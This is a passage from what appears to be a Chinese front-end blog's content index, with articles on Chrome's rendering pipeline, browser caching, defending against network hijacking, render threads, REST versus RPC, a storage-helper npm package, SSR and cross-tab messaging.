512x512，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e40a20ea9cb1403440a1c.png\" alt=\"图层被划分为图块示意图\"></p>\n<p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图</strong>。而图块是栅格化执行的最小单位。渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e40fb0ea9cb140344bde8.png\" alt=\"合成线程提交图块给栅格化线程池\"></p>\n<p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p>\n<p>相信你还记得，GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e412d0ea9cb140345186c.png\" alt=\"GPU栅格化\"></p>\n<p>从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。</p>\n<h2 id=\"合成和显示\"><a href=\"#合成和显示\" class=\"headerlink\" title=\"合成和显示\"></a>合成和显示</h2><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令 ——“DrawQuad”，然后将该命令提交给浏览器进程。</p>\n<p>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p>\n<p>到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面了。</p>\n<h2 id=\"渲染流水线大总结\"><a href=\"#渲染流水线大总结\" class=\"headerlink\" title=\"渲染流水线大总结\"></a>渲染流水线大总结</h2><p>好了，我们现在已经分析完了整个渲染流程，从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e41d80ea9cb1403463b38.png\" alt=\"完整的渲染流水线示意图\"></p>\n<p>结合上图，我们可以大致总结为：</p>\n<ul>\n<li>渲染进程将 HTML 内容转化为浏览器可以识别的 DOM 树结构；</li>\n<li>渲染引擎将 CSS 样式表转化为浏览器可以理解的 styleSheets，计算出 DOM 节点的样式；</li>\n<li>创建布局树，并计算元素的布局信息；</li>\n<li>对布局树进行分层，并生成分层树；</li>\n<li>为每个图床生成<strong>绘制列表</strong>，并将其提交到合成线程；</li>\n<li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转化成位图；</li>\n<li>合成线程发送绘制图块命令 <code>DrawQuad</code> 给浏览器进程；</li>\n<li>浏览器根据 <code>DrawQuad</code> 消息生成页面，并显示到显示器上。</li>\n</ul>\n<h2 id=\"相关概念\"><a href=\"#相关概念\" class=\"headerlink\" title=\"相关概念\"></a>相关概念</h2><p>有了上面介绍渲染流水线的基础，我们再来看看三个和渲染流水线相关的概念 ——<strong>“重排”“重绘” 和 “合成”</strong>。理解了这三个概念对于你后续 Web 的性能优化会有很大帮助。</p>\n<h3 id=\"1-更新了元素的几何属性（重排）\"><a href=\"#1-更新了元素的几何属性（重排）\" class=\"headerlink\" title=\"1. 更新了元素的几何属性（重排）\"></a>1. 更新了元素的几何属性（重排）</h3><p>你可先参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e4a980ea9cb140354fc18.png\" alt=\"更新元素的几何属性\"></p>\n<p>从上图可以看出，如果你通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫<strong>重排</strong>。无疑，<strong>重排需要更新完整的渲染流水线，所以开销也是最大的</strong>。</p>\n<h3 id=\"2-更新元素的绘制属性（重绘）\"><a href=\"#2-更新元素的绘制属性（重绘）\" class=\"headerlink\" title=\"2. 更新元素的绘制属性（重绘）\"></a>2. 更新元素的绘制属性（重绘）</h3><p>接下来，我们再来看看重绘，比如通过 JavaScript 更改某些元素的背景颜色，渲染流水线会怎样调整呢？你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e4af50ea9cb140355ae73.png\" alt=\"更新元素背景\"></p>\n<p>从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫<strong>重绘</strong>。相较于重排操作，<strong>重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些</strong>。</p>\n<h3 id=\"3-直接合成阶段\"><a href=\"#3-直接合成阶段\" class=\"headerlink\" title=\"3. 直接合成阶段\"></a>3. 直接合成阶段</h3><p>那如果你更改一个既不要布局也不要绘制的属性，会发生什么变化呢？渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做<strong>合成</strong>。具体流程参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/661e4b6d0ea9cb14035676b3.png\" alt=\"避开重排和重绘\"></p>\n<p>在上图中，我们使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>通过本文的分析，你应该可以看到，Chrome 的渲染流水线还是相当复杂晦涩，且难以理解，不过 Chrome 团队在不断添加新功能的同时，也在不断地重构一些子阶段，目的就是让整体渲染架构变得更加简单和高效，正所谓大道至简。</p>\n<p>通过这么多年的生活和工作经验来看，无论是做架构设计、产品设计，还是具体到代码的实现，甚至处理生活中的一些事情，能够把复杂问题简单化的人都是具有大智慧的。所以，在工作或生活中，你若想要简化遇到的问题，就要刻意地练习，练就抓住问题本质的能力，把那些复杂的问题简单化，从而最终真正解决问题。</p>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","http"]},{"title":"浏览器缓存的全过程","url":"//browser/mechanism/cache.html","content":"<h3 id=\"浏览器缓存的全过程\"><a href=\"#浏览器缓存的全过程\" class=\"headerlink\" title=\"浏览器缓存的全过程\"></a>浏览器缓存的全过程</h3><p><img data-src=\"https://pic.imgdb.cn/item/65323b8ec458853aef72a6ad.png\" alt=\"浏览器缓存的全过程\"></p>\n<p>浏览器缓存的全过程涉及了几种不同的缓存机制，主要包括浏览器缓存和 HTTP 协议中定义的缓存控制策略。下面是浏览器缓存的全过程的概览：</p>\n<ol>\n<li><p>用户方法网页</p>\n<p> 浏览器根据用户请求的 URL 加载相应的网页；</p>\n</li>\n<li><p>浏览器检查缓存</p>\n<p> 浏览器首先检查它的本地缓存（强缓存），检查请求的资源是否已经缓存，并且缓存是否仍然有效（根据 Expires 和 Cache-Control 响应头）；</p>\n</li>\n</ol>\n","categories":["浏览器","缓存"],"tags":["前端","浏览器"]},{"title":"网络劫持有哪几种，如何防范？","url":"//browser/network/hijack.html","content":"<h5 id=\"⽹络劫持\"><a href=\"#⽹络劫持\" class=\"headerlink\" title=\"⽹络劫持\"></a>⽹络劫持</h5><ol>\n<li>DNS 劫持: (输⼊京东被强制跳转到淘宝这就属于 dns 劫持)</li>\n</ol>\n<ul>\n<li>DNS 强制解析：通过修改运营商的本地 DNS 记录，来引导⽤户流量到缓存服务器</li>\n<li> 302 跳转的⽅式：通过监控⽹络出⼝的流量，分析判断哪些内容是可以进⾏劫持处理的，再对劫持的内存发起 302 跳转的回复，引导⽤户获取内容</li>\n</ul>\n<ol start=\"2\">\n<li> HTTP 劫持: (访问⾕歌但是⼀直有贪玩蓝⽉的⼴告), 由于 http 明⽂传输，运营商会修改你的 http 响应内容 (即加⼴告)</li>\n</ol>\n<h5 id=\"如何防范网络劫持？\"><a href=\"#如何防范网络劫持？\" class=\"headerlink\" title=\"如何防范网络劫持？\"></a>如何防范网络劫持？</h5><p>DNS 劫持由于涉嫌违法，已经被监管起来，现在很少会有 DNS 劫持，⽽ http 劫持依然⾮常盛⾏，最有效的办法就是全站 HTTPS，将 HTTP 加密，这使得运营商⽆法获取明⽂，就⽆法劫持你的响应内容。</p>\n<p>网络劫持指的是网络中的某个节点对数据进行恶意篡改和篡改，以达到非法获取用户信息或者控制用户设备的目的。以下是预防网络劫持的几个方法：</p>\n<ol>\n<li><p>使用 HTTPS：HTTPS 是一个安全的协议，对通信进行加密和身份验证，防止劫持者对数据进行篡改。使用 HTTPS 之前，可以使用 SSL 证书来验证服务器的身份。</p>\n</li>\n<li><p>使用 VPN：VPN 可以加密数据并建立一个虚拟私人网络，从而保护用户的数据和隐私。使用 VPN 可以防止网络劫持和嗅探攻击。</p>\n</li>\n<li><p>使用防火墙和反病毒软件：网络劫持者可能会通过恶意软件或病毒对用户设备进行攻击，使用防火墙和反病毒软件可以防止这种攻击。</p>\n</li>\n<li><p>更新操作系统和软件程序：最新版本的操作系统和软件程序通常包含了修复安全漏洞的补丁。不定期更新操作系统和软件程序可以减少遭受网络攻击的风险。</p>\n</li>\n<li><p>警惕钓鱼网站和不安全的链接：劫持者可能会伪造合法的网站或链接，引导用户向其提供个人信息或下载恶意软件。不要轻信不安全的链接，要时刻保持警惕。</p>\n</li>\n</ol>\n","categories":["浏览器","网路安全"],"tags":["前端","浏览器","网路安全"]},{"title":"浏览器的渲染进程的线程","url":"//browser/render/process.html","content":"<h4 id=\"浏览器的渲染进程的线程\"><a href=\"#浏览器的渲染进程的线程\" class=\"headerlink\" title=\"浏览器的渲染进程的线程\"></a>浏览器的渲染进程的线程</h4><p><img data-src=\"https://pic.imgdb.cn/item/6532800ac458853aef6782e0.png\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"GUI-渲染线程\"><a href=\"#GUI-渲染线程\" class=\"headerlink\" title=\"GUI 渲染线程\"></a>GUI 渲染线程</h5><p>GUI 渲染线程是在 GUI 应用程序中负责界面渲染的线程。负责渲染浏览器页面，解析 HTML、CSS，构建 DOM 树、构建 CSSOM 树、构建渲染树和绘制页面；当界面需要重绘或由于某种操作引发回流时，该线程就会执行。</p>\n<p>在许多 GUI 应用程序中，渲染线程通常会在主线程中运行，这可能会导致界面卡顿或响应时间过长。为了避免这种情况，一些框架和库已经实现了将 GUI 渲染线程与主线程分离的机制，例如 Android 中的 UI 线程和渲染线程分离机制。</p>\n<p>当渲染线程与主线程分离时，它可以专注于绘制和更新屏幕上的内容，而主线程则可以处理用户输入和其他逻辑。这样可以提高应用程序的响应速度和用户体验。</p>\n<p><strong>注意</strong>：GUI 渲染线程和 JS 引擎线程是互斥的，当 JS 引擎执行时 GUI 线程会被挂起，GUI 更新会被保存在一个队列中等到 JS 引擎空闲时立即被执行。</p>\n<h5 id=\"JS-引擎线程\"><a href=\"#JS-引擎线程\" class=\"headerlink\" title=\"JS 引擎线程\"></a>JS 引擎线程</h5><p>JS 引擎线程也称为 JS 内核，负责处理 Javascript 脚本程序，解析 Javascript 脚本，运行代码；JS 引擎线程一直等待着任务队列中任务的到来，然后加以处理，一个 Tab 页中无论什么时候都只有一个 JS 引擎线程在运行 JS 程序。</p>\n<p>在浏览器环境中，JavaScript 引擎线程负责解释和执行 JavaScript 代码，并将执行结果返回给主线程。JavaScript 引擎线程通常是单线程的，这意味着它只能同时执行一个任务。这就是为什么一些耗时的 JavaScript 代码可以阻止页面的渲染和响应。</p>\n<p>为了解决这个问题，浏览器引入了 Web Workers，使得可以使用多个 JavaScript 引擎线程来执行 JavaScript 代码。这些工作线程可以并行地执行 JavaScript 代码，并在完成任务后将结果返回给主线程，从而防止 JavaScript 代码阻塞页面的渲染和响应。</p>\n<p><strong>注意</strong>：GUI 渲染线程与 JS 引擎线程的互斥关系，所以如果 JS 执行的时间过长，会造成页面的渲染不连贯，导致页面渲染加载阻塞。</p>\n<h5 id=\"时间触发线程\"><a href=\"#时间触发线程\" class=\"headerlink\" title=\"时间触发线程\"></a>时间触发线程</h5><p>时间触发线程属于浏览器而不是 JS 引擎，用来控制事件循环；当 JS 引擎执行代码块如 setTimeOut 时（也可是来自浏览器内核的其他线程，如鼠标点击、AJAX 异步请求等），会将对应任务添加到事件触发线程中；当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待 JS 引擎的处理。</p>\n<p>时间触发线程在浏览器中起着非常重要的作用，因为它们可以帮助网站实现许多不同的功能，包括：</p>\n<ul>\n<li><p>启动定时器：当网页需要执行一些定时任务时，可以使用时间触发线程来启动定时器。</p>\n</li>\n<li><p>处理事件：当用户与网页交互时，例如点击按钮或提交表单，时间触发线程将负责处理这些事件并执行相应的回调函数。</p>\n</li>\n<li><p>处理异步请求：当网页需要从服务器获取数据时，可以使用时间触发线程来处理异步请求并执行回调函数。</p>\n</li>\n</ul>\n<p><strong>注意</strong>：由于 JS 的单线程关系，所以这些待处理队列中的事件都得排队等待 JS 引擎处理（当 JS 引擎空闲时才会去执行）。</p>\n<h5 id=\"定时器触发进程\"><a href=\"#定时器触发进程\" class=\"headerlink\" title=\"定时器触发进程\"></a>定时器触发进程</h5><p>浏览器定时器触发进程是指浏览器中用来触发定时器的进程。在浏览器中，定时器可以使用 JavaScript 的 setTimeout () 和 setInterval () 方法来创建。当设置的时间到达后，浏览器会触发定时器，并执行对应的函数。</p>\n<p>定时器触发进程通常由内核管理，它会在特定时间间隔内不断运行，并检查是否有定时器需要触发。当定时器触发时，该进程会将需要执行的任务推入待执行队列中，然后通知主线程执行。主线程会不断检查待执行队列，如果有任务待执行，则将其取出并执行。</p>\n<p>需要<strong>注意</strong>的是，如果执行的任务需要较长时间才能完成，会导致主线程阻塞，影响页面的响应速度。因此，应该尽可能避免在定时器中执行复杂的任务，或者使用 Web Worker 在后台执行任务，以避免阻塞主线程。</p>\n<p><strong>注意</strong>：W3C 在 HTML 标准中规定，定时器的定时时间不能小于 4ms，如果是小于 4ms，则默认为 4ms。</p>\n<h5 id=\"异步-http-请求线程\"><a href=\"#异步-http-请求线程\" class=\"headerlink\" title=\"异步 http 请求线程\"></a>异步 http 请求线程</h5><p>在浏览器中，异步 HTTP 请求线程通常由浏览器内部的 JavaScript 引擎处理。当 JavaScript 代码发起一个异步 HTTP 请求时，浏览器会创建一个新的线程来处理该请求，该线程通常是浏览器的网络线程。在该线程中，浏览器会向服务器发送 HTTP 请求，并等待服务器返回响应。</p>\n<p>在等待服务器响应的同时，JavaScript 引擎会继续执行其他代码，不会被阻塞。当服务器返回响应后，浏览器会将响应数据传递给 JavaScript 引擎，在 JavaScript 线程中执行相应的回调函数，用来处理响应数据。</p>\n<p>需要注意的是，由于浏览器对跨域请求进行了限制，在异步 HTTP 请求线程中发起的跨域请求需要经过浏览器的安全机制进行处理，一般需要设置相关的请求头或者使用 JSONP 等技术来解决。</p>\n","categories":["浏览器","渲染"],"tags":["前端","浏览器","GUI"]},{"title":"RESTful 和 RPC 的区别","url":"//browser/restful/and/rpc.html","content":"<h4 id=\"RESTful\"><a href=\"#RESTful\" class=\"headerlink\" title=\"RESTful\"></a>RESTful</h4><p>RESTful 是一种基于 HTTP 协议，通过 URL、HTTP 方法和参数等方式来访问和操作资源的设计风格和架构方法。它是一种轻量级的、高效的、无状态的 Web 服务架构，可以用于设计和开发各种类型的 Web 应用程序和分布式系统。</p>\n<p>RESTful 的核心思想是资源的定义和管理，将系统中的资源抽象为一组 URI（统一资源标识符），通过 HTTP 方法来对资源进行访问和操作。常用的 HTTP 方法有 GET、POST、PUT、DELETE 等，它们分别对应着资源的查询、新增、更新和删除操作。</p>\n<p>RESTful 的优势在于它简单、灵活、可伸缩、易于维护和扩展。它采用标准的 HTTP 协议和常见的数据格式（如 JSON、XML 等），使得开发人员可以快速地开发出高效、可靠的 Web 服务，并且可以方便地与其他系统进行集成和交互。</p>\n<h4 id=\"RPC（Remote-Procedure-Call）\"><a href=\"#RPC（Remote-Procedure-Call）\" class=\"headerlink\" title=\"RPC（Remote Procedure Call）\"></a>RPC（Remote Procedure Call）</h4><p>RPC（Remote Procedure Call）即远程过程调用，是一种分布式系统中的通信协议。RPC 允许一个程序在另一个计算机上运行的程序请求服务，而不需要了解底层网络细节，就像本地调用一样。</p>\n<p>RPC 的原理是客户端发送请求给服务端，服务端执行相应的操作并返回结果给客户端。RPC 框架隐藏了底层的网络细节和通信协议，使得开发者可以像使用本地函数一样方便地调用远程函数。</p>\n<p>RPC 的优势在于它提供了高效、简单、可靠的远程调用机制，使得分布式系统开发更加便捷。同时，RPC 框架支持多种编程语言和跨平台，使得开发者可以使用不同的编程语言和技术栈来实现分布式系统。一些常用的 RPC 框架有 gRPC、Apache Thrift、Dubbo 等。</p>\n<h4 id=\"RESTful和RPC是两种不同的远程调用方式，它们的区别主要包括以下几个方面：\"><a href=\"#RESTful和RPC是两种不同的远程调用方式，它们的区别主要包括以下几个方面：\" class=\"headerlink\" title=\"RESTful和RPC是两种不同的远程调用方式，它们的区别主要包括以下几个方面：\"></a>RESTful 和 RPC 是两种不同的远程调用方式，它们的区别主要包括以下几个方面：</h4><ol>\n<li><h5 id=\"设计理念：\"><a href=\"#设计理念：\" class=\"headerlink\" title=\"设计理念：\"></a>设计理念：</h5><ul>\n<li><p>RESTful：是基于 HTTP 协议设计的，着重于资源的定义和管理，通过 URL、HTTP 方法和参数等方式进行资源的访问和操作。</p>\n</li>\n<li><p>RPC：是基于函数调用的，着重于接口的定义和数据传输格式的规范，通过序列化和反序列化来实现远程调用。</p>\n</li>\n</ul>\n</li>\n<li><h5 id=\"通信协议：\"><a href=\"#通信协议：\" class=\"headerlink\" title=\"通信协议：\"></a>通信协议：</h5><ul>\n<li><p>RESTful：使用 HTTP 协议进行通信，支持 GET、POST、PUT、DELETE 等 HTTP 方法。</p>\n</li>\n<li><p>RPC：使用自定义的协议进行通信，可以使用 TCP、UDP 等网络协议，也可以使用 HTTP 作为传输协议。</p>\n</li>\n</ul>\n</li>\n<li><h5 id=\"数据传输格式：\"><a href=\"#数据传输格式：\" class=\"headerlink\" title=\"数据传输格式：\"></a>数据传输格式：</h5><ul>\n<li><p>RESTful：通常使用 JSON、XML 等文本格式进行数据传输。</p>\n</li>\n<li><p>RPC：通常使用二进制格式进行数据传输，传输效率更高。</p>\n</li>\n</ul>\n</li>\n<li><h5 id=\"调用方式：\"><a href=\"#调用方式：\" class=\"headerlink\" title=\"调用方式：\"></a>调用方式：</h5><ul>\n<li><p>RESTful：通过 HTTP 方法进行资源的访问和操作，支持无状态的请求，可以使用缓存等机制提高性能和可伸缩性。</p>\n</li>\n<li><p>RPC：通过函数调用进行接口的访问和操作，需要保持请求和响应之间的状态，不支持缓存等机制。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p>综上所述，RESTful 更加适用于 Web 应用程序和分布式系统的开发，而 RPC 更加适用于高性能和低延迟的系统调用。</p>\n","categories":["浏览器","协议"],"tags":["前端","浏览器","RESTful","RPC","HTTP"]},{"title":"session-cookies 三个缓存 localStorage、sessionStorage、Cookies。","url":"//browser/session/cookies.html","content":"<h1 id=\"session-cookies\"><a href=\"#session-cookies\" class=\"headerlink\" title=\"session-cookies\"></a>session-cookies</h1><pre><code>session-cookies is localStorage、sessionStorage、Cookies。\n</code></pre>\n<p> <a href=\"https://badge.fury.io/js/session-cookies\"><img data-src=\"https://badge.fury.io/js/session-cookies.svg\"></a></p>\n<p>session-cookies This plugin is used to summarize the browser’s three caches localStorage, sessionStorage, Cookies.The plugin is designed to be quick and easy to use. Below is a summary of some apis.</p>\n<p>session-cookies 这个插件是用来汇总浏览器的三个缓存 localStorage、sessionStorage、Cookies。该插件注重使用方便快捷下面是一些 API 汇总说明。</p>\n<h4 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h4><table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">获取所有</th>\n<th align=\"center\">获取单个</th>\n<th align=\"center\">设置单个</th>\n<th align=\"center\">移除单个</th>\n<th align=\"center\">清除所有</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"> cookies</td>\n<td align=\"center\">getCookieList</td>\n<td align=\"center\">getCookie</td>\n<td align=\"center\">setCookie</td>\n<td align=\"center\">removeCookie</td>\n<td align=\"center\">clearCookie</td>\n</tr>\n<tr>\n<td align=\"center\">session</td>\n<td align=\"center\">getAllSessionStorage</td>\n<td align=\"center\">getSessionStorage</td>\n<td align=\"center\">setSessionStorage</td>\n<td align=\"center\">removeSessionStorage</td>\n<td align=\"center\">clearSessionStorage</td>\n</tr>\n<tr>\n<td align=\"center\">local</td>\n<td align=\"center\">getAllLocalStorage</td>\n<td align=\"center\">getLocalStorage</td>\n<td align=\"center\">setLocalStorage</td>\n<td align=\"center\">removeLocalStorage</td>\n<td align=\"center\">clearLocalStorage</td>\n</tr>\n</tbody></table>\n<h4 id=\"使用案例\"><a href=\"#使用案例\" class=\"headerlink\" title=\"使用案例\"></a>使用案例</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">npm i session-cookies</span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"获取所有Cookies\"><a href=\"#获取所有Cookies\" class=\"headerlink\" title=\"获取所有Cookies\"></a>获取所有 Cookies</h5><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { cookies } <span class=\"keyword\">from</span> <span class=\"string\">'session-cookies'</span></span><br><span class=\"line\"></span><br><span class=\"line\">cookies.<span class=\"title function_\">getCookieList</span>(); <span class=\"comment\">// 返回JSON结果数据</span></span><br><span class=\"line\">cookies.<span class=\"title function_\">getCookie</span>(<span class=\"string\">'test'</span>); <span class=\"comment\">// 返回属性值</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"设置单个\"><a href=\"#设置单个\" class=\"headerlink\" title=\"设置单个\"></a>设置单个</h5><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">cookies.<span class=\"title function_\">setCookie</span>(<span class=\"string\">'test'</span>, <span class=\"string\">'1234567'</span>); <span class=\"comment\">// 设置属性为字符串需要JSON.stringify</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"移除单个\"><a href=\"#移除单个\" class=\"headerlink\" title=\"移除单个\"></a>移除单个</h5><figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">cookies.<span class=\"title function_\">removeCookie</span>(<span class=\"string\">'test'</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"清除所有\"><a href=\"#清除所有\" class=\"headerlink\" title=\"清除所有\"></a>清除所有</h5><figure class=\"highlight tsx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">cookies.<span class=\"title function_\">clearCookie</span>();</span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"附加API\"><a href=\"#附加API\" class=\"headerlink\" title=\"附加API\"></a>附加 API</h4><table>\n<thead>\n<tr>\n<th>根据 index 下标获取 key 值</th>\n<th>参数</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody><tr>\n<td> getLocalStorageKeyFindIndex</td>\n<td>index 下标</td>\n<td>返回 key</td>\n</tr>\n<tr>\n<td>getSessionStorageKeyFindIndex</td>\n<td>index 下标</td>\n<td>返回 key</td>\n</tr>\n</tbody></table>\n<h5 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h5><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { local } <span class=\"keyword\">from</span> <span class=\"string\">'session-cookies'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">local.<span class=\"title function_\">setLocalStorage</span>(<span class=\"string\">'test'</span>, <span class=\"string\">'123456'</span>);</span><br><span class=\"line\">local.<span class=\"title function_\">setLocalStorage</span>(<span class=\"string\">'usename'</span>, <span class=\"string\">'songshao'</span>);</span><br><span class=\"line\">local.<span class=\"title function_\">getLocalStorageKeyFindIndex</span>(<span class=\"number\">0</span>); <span class=\"comment\">// test</span></span><br><span class=\"line\">local.<span class=\"title function_\">getLocalStorageKeyFindIndex</span>(<span class=\"number\">1</span>); <span class=\"comment\">// username</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Browsers\"><a href=\"#Browsers\" class=\"headerlink\" title=\"Browsers\"></a>Browsers</h3><figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 只能使用0.1.5 以后版本 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">'https://unpkg.com/session-cookies/lib/sessionCookies.js'</span> &gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"comment\">// 其他接口同上面使用只需要增加 sessionCookies 全局配置。</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    sessionCookies.<span class=\"property\">local</span>.<span class=\"title function_\">setLocalStorage</span>(<span class=\"string\">'test'</span>, <span class=\"string\">'123456'</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["浏览器","Cache"],"tags":["前端","浏览器","cookies","localStorage","sessionStorage","TypeScript"]},{"title":"服务器端渲染（Server-Side Rendering，简称 SSR）","url":"//browser/render/ssr.html","content":"<p>服务端渲染（Server-Side Rendering，简称 SSR）是一种 Web 应用的渲染方式，其中 HTML 是在服务器上生成的，并作为完整页面发送到客户端（通常是浏览器）。客户端然后解析和显示这个 HTML。这种方法与客户端渲染（Client-Side Rendering，简称 CSR）形成对比，在客户端渲染中，浏览器下载一个最小的 HTML 页面，随后使用 JavaScript 动态生成页面内容。</p>\n<h2 id=\"服务端渲染的主要优势和特点包括\"><a href=\"#服务端渲染的主要优势和特点包括\" class=\"headerlink\" title=\"服务端渲染的主要优势和特点包括\"></a>服务端渲染的主要优势和特点包括</h2><ol>\n<li><p>更快的首次加载:</p>\n<p> 对于用户来说，SSR 可以更快地显示页面的首次可见内容，因为浏览器接收到的是已经渲染的页面。用户不需要等待所有的 JavaScript 加载、执行以及渲染完成。</p>\n</li>\n<li><p>搜索引擎优化（SEO）:</p>\n<p> SSR 对 SEO 更加友好，因为搜索引擎爬虫可以直接抓取和索引服务器渲染的 HTML 内容。而在 CSR 中，爬虫可能需要等待 JavaScript 执行完成，有些搜索引擎的爬虫可能不会执行 JavaScript，这会影响内容的可索引性。</p>\n</li>\n<li><p>共享重复功能:</p>\n<p> 使用 SSR，服务器可以为多个请求重用页面生成的结果，比如通过缓存，提高效率。</p>\n</li>\n<li><p>更好的性能:</p>\n<p> 对于计算能力较低的设备，SSR 可以提供更好的性能体验，因为服务器通常比客户端设备拥有更强的处理能力。</p>\n</li>\n<li><p>简化前端复杂性:</p>\n<p> SSR 应用可能不需要像完全的客户端应用那样复杂的 JavaScript 框架或库。</p>\n</li>\n<li><p>更好的用户体验:</p>\n<p> 用户看到的是完整的页面，因此在页面变得可交互之前，他们可以先阅读内容，而不是看到一个空白屏幕或加载指示符。</p>\n</li>\n</ol>\n<p>然而，服务端渲染也有一些潜在的缺点：</p>\n<ol>\n<li><p>服务器负载:</p>\n<p> SSR 可能会增加服务器的负载，因为服务器必须为每个请求生成页面内容。</p>\n</li>\n<li><p>时间到首字节（TTFB）:</p>\n<p> 虽然用户可以更快地看到内容，但是生成页面内容的服务器处理时间可能会导致更长的时间到首字节。</p>\n</li>\n<li><p>客户端 JavaScript 还是需要:</p>\n<p> 即使页面在服务器上预先渲染，通常客户端 JavaScript 仍然需要以便为页面添加交互功能。</p>\n</li>\n<li><p>复杂的缓存策略:</p>\n<p> 如果页面内容经常变化，实现有效的服务器缓存策略可能会变得复杂。</p>\n</li>\n<li><p>延迟的交互:</p>\n<p> 用户可能能够看到页面内容，但要等到 JavaScript 下载和执行完成后，页面才变得可交互。</p>\n</li>\n</ol>\n<p>SSR 在许多现代 Web 开发框架和库中都得到了支持，如 Next.js（基于 React）、Nuxt.js（基于 Vue.js）和 Angular Universal。这些工具都提供了简化服务端渲染工作流程的功能。</p>\n","categories":["浏览器","render","SSR"],"tags":["前端","浏览器","SSR"]},{"title":"如何实现浏览器内多个标签页之间的通信？","url":"//browser/tab/to/tab.html","content":"<p>实现多个标签页之间的通信，本质上都是通过中介者模式来实现的。因为标签页之间没有办法直接通信，因此我们可以找一个中介者，让标签页和中介者进行通信，然后让这个中介者来进行消息的转发。通信方法如下：</p>\n<ul>\n<li>使用 websocket 协议，因为 websocket 协议可以实现服务器推送，所以服务器就可以用来当做这个中介者。标签页通过向服务器发送数据，然后由服务器向其他标签页推送转发。</li>\n<li>使用 ShareWorker 的方式，shareWorker 会在页面存在的生命周期内创建一个唯一的线程，并且开启多个页面也只会使用同一个线程。这个时候共享线程就可以充当中介者的角色。标签页间通过共享一个线程，然后通过这个共享的线程来实现数据的交换。</li>\n<li>使用 localStorage 的方式，我们可以在一个标签页对 localStorage 的变化事件进行监听，然后当另一个标签页修改数据的时候，我们就可以通过这个监听事件来获取到数据。这个时候 localStorage 对象就是充当的中介者的角色。</li>\n<li>使用 postMessage 